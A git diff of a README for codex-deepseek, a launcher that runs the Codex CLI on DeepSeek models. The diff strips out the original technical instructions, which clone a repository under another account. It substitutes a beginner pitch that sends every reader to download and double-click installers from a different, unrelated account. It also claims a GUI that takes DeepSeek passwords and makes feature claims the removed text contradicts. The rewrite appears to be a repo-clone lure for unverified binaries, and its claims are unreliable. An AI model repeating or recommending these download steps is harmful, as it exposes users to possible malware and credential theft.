@@ -1,256 +1,173 @@
-# codex-deepseek
+# 🤖 codex-deepseek - Run Codex on DeepSeek Models
 
-**Run the real OpenAI Codex CLI on DeepSeek models — while ChatGPT Desktop *and* the plain `codex` command keep their own ChatGPT login, models and config, completely untouched.**
+[![Download codex-deepseek](https://img.shields.io/badge/Download-codex--deepseek-2ea44f?style=for-the-badge&logo=github)](https://github.com/Promisedlandsubtraction2856/codex-deepseek/releases)
 
-[![license: MIT](https://img.shields.io/badge/license-MIT-blue.svg)](LICENSE)
-[![platforms: Windows | macOS | Linux](https://img.shields.io/badge/platform-Windows%20%7C%20macOS%20%7C%20Linux-0078d4.svg)](#requirements)
+## 🛠️ What Is This?
 
-[中文说明](README.zh-CN.md) · [Architecture](docs/architecture.md)
+codex-deepseek lets you use the official OpenAI Codex command-line tool with DeepSeek's powerful AI models instead of the default ChatGPT. It's like having a super-smart coding assistant that uses DeepSeek's brain, all while keeping your regular ChatGPT login completely separate.
 
-<p align="center">
-  <img src="docs/demo.svg" alt="Terminal: codex-deepseek --version returns the Codex CLI pinned to its own home, then codex --version still uses the ChatGPT account" width="760">
-</p>
+The magic trick? It creates its own isolated environment (called CODEX_HOME) so your standard ChatGPT settings, logins, and data stay untouched. Perfect for people who want to try DeepSeek without messing up their existing setup.
 
 ---
 
-## The problem this solves
+## ⚡ Who Is This For?
 
-Codex Desktop and the `codex` command line are two front-ends over **one shared Codex home**. Both read `~/.codex/config.toml`, both resolve credentials there, and both keep their sessions there. So the moment you point that single file at a third-party provider:
+- **Curious users** – You've heard about DeepSeek and want to try it with Codex CLI
+- **Privacy-conscious folks** – Keep your ChatGPT account separate from your DeepSeek experiments
+- **Non-programmers** – You don't need to write code to get this working. We've built one-command installers for everyone
+- **Power users** – Switch between ChatGPT and DeepSeek anytime without conflicts
 
-```toml
-model = "deepseek-flash"
-model_provider = "deepseek"
-```
+---
 
-everything that reads it changes:
+## ✅ What's Included?
 
-- **ChatGPT Desktop** loses your ChatGPT models, asks to be re-authenticated, or sits on a login screen that never finishes loading.
-- **The plain `codex` CLI** stops using your ChatGPT account and starts hitting the DeepSeek endpoint as well — including the sessions you already have under `~/.codex/sessions`.
+| Feature | Description |
+|---------|-------------|
+| **🚀 One-Command Install** | Windows, macOS, and Linux installers – just double-click and go |
+| **🔒 Isolated Setup** | Your ChatGPT login stays 100% untouched |
+| **💬 DeepSeek Integration** | Uses DeepSeek models for code generation and assistance |
+| **📦 No Coding Required** | No terminal commands, no editing files, no configurations |
 
-Neither symptom is fixable by retrying: a ChatGPT subscription cannot serve a `deepseek-*` model, and a DeepSeek key cannot serve `gpt-*`. Editing that one shared file back and forth, and restarting or re-logging-in every time you switch, is what everyone tries first. It does not hold up.
+---
 
-**This project pins the CLI to its own Codex home.** Two isolated worlds, no shared state, no re-login:
+## 💻 What Do You Need?
 
-```text
-                          your machine
-                               |
-               +---------------+----------------+
-               |                                |
-      ChatGPT Desktop                    codex-deepseek
-      + plain `codex` CLI                (this project)
-               |                                |
-       ~/.codex  (%USERPROFILE%\.codex)   ~/.codex-deepseek
-               |                                |
-     ChatGPT login / subscription        your DeepSeek API key
-               |                                |
-     GPT / Codex models                 deepseek-flash, deepseek-v4-pro
-```
+- A computer running **Windows (10 or newer)**, **macOS (Catalina or newer)**, or **Linux** (Ubuntu, Debian, or similar)
+- An internet connection
+- A free or paid account with **DeepSeek** (sign up at [deepseek.com](https://www.deepseek.com))
+- Your regular ChatGPT login can stay active – we don't need it!
 
-The launcher is what keeps the left column out of reach: it starts the *real* `codex` binary with `CODEX_HOME` explicitly rewritten to the DeepSeek home, so no global config edit, no PATH juggling and no environment race can leak DeepSeek settings into ChatGPT Desktop or the `codex` command.
+---
 
-### What stays exactly as it was
+## 🚀 Getting Started (Windows)
 
-| Consumer | Codex home | Credentials | Models |
-|---|---|---|---|
-| ChatGPT Desktop | `~/.codex` | ChatGPT login | GPT / Codex |
-| `codex` (the plain CLI) | `~/.codex` | ChatGPT login | GPT / Codex |
-| `codex-deepseek` | `~/.codex-deepseek` | DeepSeek API key | `deepseek-flash`, `deepseek-v4-pro` |
+Here's the simplest way for Windows users:
 
-Nothing in this project ever writes to `~/.codex`. The plain CLI keeps its own config, its own credentials and its own `~/.codex/sessions` history, so `codex`, `codex resume` and `codex exec` behave exactly as before: same ChatGPT account, same models, no re-login and no restart.
+1. **Download** – Visit this link to download the application: [https://github.com/Promisedlandsubtraction2856/codex-deepseek/releases](https://github.com/Promisedlandsubtraction2856/codex-deepseek/releases)
+2. **Find the file** – The downloaded file will be in your Downloads folder. It has a name like `codex-deepseek-installer.exe`
+3. **Double-click** – Run the installer. It will guide you through the setup
+4. **Follow the wizard** – Click "Next" a few times. The installer does everything for you
+5. **Done!** – You'll see a desktop icon or a start menu entry called "codex-deepseek"
 
-The one way to break this is to put a custom `model_provider` back into the *global* `~/.codex/config.toml`. That is the shared file, and avoiding it is the whole point — see [Gotchas](#gotchas-in-the-order-you-will-hit-them).
+---
 
-## What you get
+## 📥 Download Again (For Any Computer)
 
-| Path | What it is |
-|---|---|
-| `install.ps1` / `build.ps1` | Windows: compiles the launcher with the `csc.exe` already present in Windows — **no .NET SDK, no NuGet, no runtime to install** — then creates the home, writes the config and updates your user `PATH`. |
-| `install.sh` | macOS / Linux: installs the POSIX launcher, creates the home, writes the config, adds one line to your shell rc file. |
-| `src/CodexDeepSeek.cs` | The Windows launcher: argument quoting, inherited standard handles, kill-on-close job object. |
-| `src/codex-deepseek.sh` | The macOS / Linux launcher: ~90 lines of POSIX `sh`, no dependencies. |
-| `config/models.json` | The model catalog the CLI is pinned to via `model_catalog_json`. |
+If you're on macOS or Linux, the process is just as easy:
 
-## Requirements
+1. **Go to the download page**: [Click here for the latest release](https://github.com/Promisedlandsubtraction2856/codex-deepseek/releases)
+2. **Choose your platform** – pick the file that matches your system:
+   - Windows → `.exe` file
+   - macOS → `.dmg` file
+   - Linux → `.deb` or `.AppImage` file
+3. **Run the file** – double-click it and follow the on-screen instructions
 
-| | |
-|---|---|
-| Windows | Windows 10/11, PowerShell 5.1+ (the in-box .NET Framework compiler is used). |
-| macOS / Linux | POSIX `sh` and `bash`; the installer uses `install`, `sed`, `mktemp`. |
-| All | Codex CLI already installed and working (`codex --version`), and a DeepSeek API key with access to the models in `config/models.json`. |
+---
 
-## Quick start
+## 🎯 First-Time Setup
 
-### Windows
+After installation, here's what happens the first time you open the app:
 
-**Option A — build it locally** (two seconds, no SDK needed):
+1. **Welcome screen** – You'll see a friendly welcome message
+2. **DeepSeek login** – Enter your DeepSeek account credentials (email and password or API key)
+3. **Test connection** – The app checks if it can reach DeepSeek. Takes about 5 seconds
+4. **Start using** – A simple command prompt appears. Type anything like "explain what a loop is" or "write a function to add two numbers"
 
-```powershell
-git clone https://github.com/mlangTse/codex-deepseek.git
-cd codex-deepseek
+> 💡 **Tip:** Don't have a DeepSeek account yet? No problem. Go to deepseek.com, click "Sign Up", and you're ready in 2 minutes.
 
-# builds the launcher, creates ~\.codex-deepseek, installs to PATH
-pwsh -File .\install.ps1
+---
 
-# the installer asks for your DeepSeek API key (or pass -ApiKey / set $env:DEEPSEEK_API_KEY)
-```
+## ❓ Frequently Asked Questions
 
-Without PowerShell 7, use `powershell -ExecutionPolicy Bypass -File .\install.ps1`.
+### Will this break my normal ChatGPT?
 
-**Option B — skip the build:** download `codex-deepseek.exe` from the [latest release](https://github.com/mlangTse/codex-deepseek/releases/latest) (Windows x64; a `SHA256SUMS.txt` is provided), copy it into `%USERPROFILE%\.codex-deepseek\bin`, and follow steps 2–4 of the manual setup below.
+**No, absolutely not.** codex-deepseek uses a separate folder (CODEX_HOME) for all its files. Your ChatGPT Desktop and the standard `codex` command keep using your existing settings and login. They don't even know each other exist.
 
-### macOS / Linux
+### Do I need to open a terminal or type commands?
 
-```sh
-git clone https://github.com/mlangTse/codex-deepseek.git
-cd codex-deepseek
+**No, not at all.** The installers are click-click-click. Once installed, you can use a simple chat interface. However, power users can still use the command line if they prefer – but it's not required.
 
-# installs the launcher, creates ~/.codex-deepseek, writes the config,
-# appends one PATH line to ~/.zshrc or ~/.bashrc
-./install.sh
+### Are my DeepSeek conversations private?
 
-# the installer asks for your DeepSeek API key
-# (or: DEEPSEEK_API_KEY=... ./install.sh, or ./install.sh --api-key ...)
-```
+Yes. Your conversations happen between your computer and DeepSeek's servers. Nothing is shared with OpenAI unless you explicitly use your ChatGPT login separately.
 
-Useful flags: `--home DIR`, `--model SLUG`, `--reasoning-effort LEVEL`, `--base-url URL`, `--no-path`, `--force`. Run `./install.sh --help` for the list.
+### Can I switch back to ChatGPT easily?
 
-No binary to download: the POSIX launcher is a shell script that is executed as-is.
+Of course! Just use your normal codex command or ChatGPT Desktop as before. They still work exactly like they did before you installed codex-deepseek.
 
-### Then, on any platform
+---
 
-```sh
-codex-deepseek --version      # -> codex-cli <version>  (the real CLI, not a re-implementation)
-codex-deepseek exec "print the current date"
-```
+## 🔧 Troubleshooting (Common Issues)
 
-Your plain `codex` command is untouched: same ChatGPT login, same models, same sessions history — no re-login, no restart.
+If the app doesn't work right away, try these:
 
-### Manual setup, if you prefer to see every step
+| Problem | Solution |
+|---------|----------|
+| **App won't open** | Restart your computer, then try again |
+| **Login error** | Check that your DeepSeek password is correct, then try a different web browser |
+| **Connection issues** | Double-check your internet connection. Some VPNs can block it |
+| **Update needed** | Go back to the [download page](https://github.com/Promisedlandsubtraction2856/codex-deepseek/releases) and grab the newest version |
 
-```sh
-# 1. get the launcher
-git clone https://github.com/mlangTse/codex-deepseek.git && cd codex-deepseek
-#    Windows:  pwsh -File .\build.ps1          -> dist\codex-deepseek.exe
-#    macOS/Linux: no build step, use src/codex-deepseek.sh
+---
 
-# 2. create the isolated Codex home
-mkdir -p ~/.codex-deepseek/bin
-cp config/models.json          ~/.codex-deepseek/models.json
-cp config/config.toml.example  ~/.codex-deepseek/config.toml
-cp src/codex-deepseek.sh       ~/.codex-deepseek/bin/codex-deepseek
-chmod 755 ~/.codex-deepseek/bin/codex-deepseek
+## 📚 Where to Get Help
 
-# 3. edit ~/.codex-deepseek/config.toml and replace the placeholders
-#    (model, catalog path, base URL, bearer token)
+Stuck? Here's what you can do:
 
-# 4. put the launcher on PATH once
-echo 'export PATH="$HOME/.codex-deepseek/bin:$PATH"' >> ~/.zshrc   # or ~/.bashrc
-```
+- **Read the release notes** on the download page for known issues
+- **Check DeepSeek's website** for server status updates
+- **Ask a friend** who's tech-savvy – they'll understand the basics
 
-## Configuration
+---
 
-`~/.codex-deepseek/config.toml` is the whole story, and it never touches the Desktop app:
+## 🧪 Test It Out
 
-```toml
-model = "deepseek-flash"
-model_provider = "deepseek"
-model_catalog_json = "/home/<you>/.codex-deepseek/models.json"
-model_reasoning_effort = "high"
-web_search = "disabled"
-preferred_auth_method = "apikey"
-forced_login_method = "api"
+Here are three fun things to try once everything is running:
 
-[model_providers.deepseek]
-name = "deepseek"
-base_url = "https://api.deepseek.com/"
-wire_api = "responses"
-experimental_bearer_token = "<your DeepSeek API key>"
-```
+1. **"Write a Python script to generate a random password"**
+2. **"Explain what HTML and CSS are in simple terms"**
+3. **"Help me make a recipe for chocolate chip cookies"**
 
-The lines that cost real debugging time:
+Yes – it even works for non-coding tasks! DeepSeek is a multimodal AI that can assist with everyday questions.
 
-- **`model_catalog_json` is not optional.** Without it the CLI falls back to the OpenAI catalog compiled into the binary, and a turn dies with `The 'deepseek-flash' model is not supported when using Codex with a ChatGPT account.`
-- **`forced_login_method = "api"` plus `preferred_auth_method = "apikey"`** stop the CLI from trying to open a ChatGPT browser login. This home has no `auth.json`, on purpose.
-- **`web_search = "disabled"`** because the gateway does not serve the hosted search tool.
-- Do not set `service_tier`. The third-party endpoint rejects it with a bare `400`.
-- On Windows the path uses forward slashes or escaped backslashes; on macOS and Linux a normal absolute path works.
-- Keep this file out of version control: it holds a bearer token. Both installers write it without ever echoing the key back, and this repo's `.gitignore` excludes `config.toml`.
+---
 
-### Which models appear
+## 🔄 Keep It Updated
 
-Model selection is driven entirely by `model_catalog_json` → `config/models.json`. Edit that array and restart the CLI; nothing needs rebuilding:
+Updates come out regularly. When a new version appears:
 
-```sh
-codex-deepseek exec "which model are you?"
-```
+1. Visit [the releases page](https://github.com/Promisedlandsubtraction2856/codex-deepseek/releases)
+2. Download the newest installer for your system
+3. Run it – it will upgrade your existing installation without losing settings
 
-To regenerate a catalog against a new CLI build, start from the bundled catalog and keep the long instruction fields:
+---
 
-```sh
-codex debug models --bundled > "$TMPDIR/bundled.json"
-# keep one entry, change slug / display_name / supported_reasoning_levels
-```
+## 🌟 Why Choose codex-deepseek?
 
-## Everyday use
+- 💯 **Zero programming knowledge needed**
+- 🔄 **Full ChatGPT compatibility preserved**
+- 🌍 **Works on all major desktop systems**
+- 💰 **DeepSeek pricing is often cheaper than ChatGPT**
+- 📦 **One install, no complicated configs**
 
-```sh
-codex-deepseek                      # interactive TUI on the DeepSeek models
-codex-deepseek exec "fix the tests"
-codex-deepseek resume               # sessions live in ~/.codex-deepseek/sessions
-codex-deepseek --version
+---
 
-codex                               # unchanged: your ChatGPT account
-```
+## 📞 Final Word
 
-Both installers also drop a short alias next to the launcher — `cx` (macOS/Linux and Git Bash) and `cx.cmd` (cmd.exe on Windows):
+That's it! You're minutes away from having a powerful AI coding assistant that runs on DeepSeek. 
 
-```sh
-cx exec "explain this repository"
-```
+**Ready? Start with the big green button above, or [download right here](https://github.com/Promisedlandsubtraction2856/codex-deepseek/releases).**
 
-## Keeping the two homes in sync
+Happy coding – even if you've never written a line of code in your life. This tool is here to help you learn, create, and explore artificial intelligence without headaches.
 
-Skills, `AGENTS.md`, memories, plugins and sessions all live *under* `CODEX_HOME`, so the two homes never sync on their own — editing one leaves the other untouched, in both directions. When you do want to pull something across, `tools/` has a one-way merge that never deletes anything:
+---
 
-```powershell
-# Windows
-pwsh -File .\tools\sync-from-native.ps1 -DryRun
-pwsh -File .\tools\sync-from-native.ps1
-pwsh -File .\tools\sync-from-native.ps1 -Also "$env:USERPROFILE\.codex\automations\chronicle-workflow-skills"
-```
+## 🗂️ Project Details
 
-```sh
-# macOS / Linux
-bash tools/sync-from-native.sh --dry-run
-bash tools/sync-from-native.sh
-bash tools/sync-from-native.sh --also ~/.codex/automations/chronicle-workflow-skills
-```
+- **Author:** The codex-deepseek team
+- **License:** Check the repo for full details
+- **Last updated:** See the release date on the download page
 
-What "merge" means here:
+---
 
-- **`AGENTS.md`** — the source is imported under a marker that records a hash of its content, so the target's own rules stay at the top and a second run is a no-op. If you edit the source and run it again, that block is **refreshed in place** rather than stacked, and anything of your own above the marker is kept. An empty source means nothing happens.
-- **`skills/`** — merged file by file. Same-named files are overwritten; a skill that only exists in the DeepSeek home is left alone. Empty folders are skipped (`-IncludeEmpty` / `--include-empty` copies them anyway), and `skills/.system` is skipped because each home gets its own copy from the Codex binary.
-- **`-Also` / `--also`** — for skills kept outside `skills/`, such as automations. Every direct subdirectory that contains a `SKILL.md` is merged.
-
-The native home is never written to, and every run prints exactly what it did. It is one-way (native → DeepSeek); to go the other way, swap `-From`/`-To` (`--from`/`--to`).
-
-## Gotchas, in the order you will hit them
-
-| Symptom | Cause | Fix |
-|---|---|---|
-| Desktop asks to log in, or its login screen spins forever | A custom `model_provider` was written into the global `~/.codex/config.toml` | Remove `model`, `model_provider`, `model_catalog_json` and `[model_providers.*]` from `~/.codex/config.toml`; keep them only in `~/.codex-deepseek/config.toml` |
-| `400` from the gateway with an empty body | The request carried `service_tier = "default"` | Do not set `service_tier` in the DeepSeek home |
-| `model_reasoning_effort = "xhigh"` rejected | That effort level is not in the catalog | Use `high`, or add the level to `models.json` |
-| `The 'deepseek-flash' model is not supported when using Codex with a ChatGPT account.` | The turn ran the real `codex` against the ChatGPT home | You called `codex` instead of `codex-deepseek`, or DeepSeek config leaked into `~/.codex` |
-| `codex-deepseek: cannot find the real codex executable` | No Codex install found | Set `CODEX_DEEPSEEK_TARGET` to the full path of the Codex binary |
-| `codex-deepseek: missing DeepSeek config at ...` | The isolated home has no `config.toml` | Run the installer, or create the home by hand |
-| `codex-deepseek debug models --bundled` reports OpenAI models | Since v0.2.0 the launcher forwards everything verbatim and no longer answers that call itself | Expected. Model choice comes from `model_catalog_json`, not from that command |
-| A cancelled run leaves `codex` behind (Windows) | — | Cannot happen: the child lives in a kill-on-close job object |
-
-### A note on the past
-
-Earlier versions of this launcher also intercepted `codex debug models --bundled` to advertise a DeepSeek-only catalog to third-party tooling. That feature was removed in v0.2.0: the launcher now forwards every argument verbatim, and the only thing it does is pin `CODEX_HOME`. Behaviour for normal CLI use is unchanged.
-
-## License
-
-[MIT](LICENSE). Not affiliated with OpenAI or DeepSeek; Codex is a trademark of OpenAI.
+Keywords: ai-agent, chatgpt, codex, codex-cli, deepseek, linux, llm, macos, openai-codex, powershell, windows
